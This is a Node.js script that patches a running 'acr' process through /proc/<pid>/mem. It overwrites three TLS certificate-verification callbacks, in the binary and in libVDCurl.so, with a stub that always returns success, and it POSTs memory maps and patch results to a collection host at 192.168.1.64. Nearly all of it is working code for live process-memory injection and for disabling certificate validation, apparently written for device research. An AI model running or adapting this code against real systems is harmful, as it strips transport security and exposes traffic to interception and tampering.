"use strict";
// audit82.js - patch ALL THREE cert-verify callbacks.
// audit81 patched acr's own two (0x96c08, 0x97c84) but handshakes still die:
// the VDCurl-based connections use VDCurl::VDCurlOperation::m_verifyCertCallback
// which lives in libVDCurl.so at file offset 0xBC24 (=48164). Get the lib base
// from /proc/<pid>/maps and patch base+0xBC24 too. Re-assert the acr patches in
// case acr restarted (in-memory patches are lost on restart).
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 15000 }).slice(0, cap || 6000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

var out = {};
out.started = new Date().toISOString();

out.pidof = sh("pidof acr", 200);
var pid = null;
var pm = trim(out.pidof).match(/^(\d+)/);
if (pm) pid = pm[1];
out.pid = pid;

if (!pid) {
    out.status = "NO_ACR_PID";
    post("/p82_diag", out);
    post("/p82_done", { started: out.started });
} else {
    out.maps = sh("cat /proc/" + pid + "/maps | grep -E 'acr|VDCurl|libssl|libbonfire' | head -20", 3000);
    // find r-xp base of libVDCurl
    var vdBase = null;
    out.maps.split("\n").forEach(function (L) {
        var m = L.match(/^([0-9a-f]+)-[0-9a-f]+ r-xp 00000000 .*libVDCurl/);
        if (m && !vdBase) vdBase = parseInt(m[1], 16);
    });
    out.vd_base = vdBase ? "0x" + vdBase.toString(16) : "NOT_FOUND";

    sh("printf '\\x01\\x20\\x70\\x47' > /tmp/.p80stub", 100);

    var T = [];
    // acr's own callbacks (absolute VAs, non-PIE)
    T.push({ name: "AcrControlVerifyCertCallback", addr: 0x96c08 });
    T.push({ name: "lws_VerifyCertCallback", addr: 0x97c84 });
    // VDCurl's callback at base + 0xBC24
    if (vdBase) T.push({ name: "VDCurl_m_verifyCertCallback", addr: vdBase + 0xBC24 });

    var res = [];
    T.forEach(function (t) {
        var dec = t.addr;
        var before = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 120));
        var wr = trim(sh("dd if=/tmp/.p80stub of=/proc/" + pid + "/mem bs=1 seek=" + dec + " count=4 conv=notrunc 2>&1 | tail -1", 120));
        var after = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 120));
        res.push({ name: t.name, addr: "0x" + t.addr.toString(16), before: before, write: wr, after: after,
                   ok: after.indexOf("01 20 70 47") >= 0 });
    });
    out.patch = res;
    post("/p82_patch", out);
    post("/p82_done", { started: out.started });
}
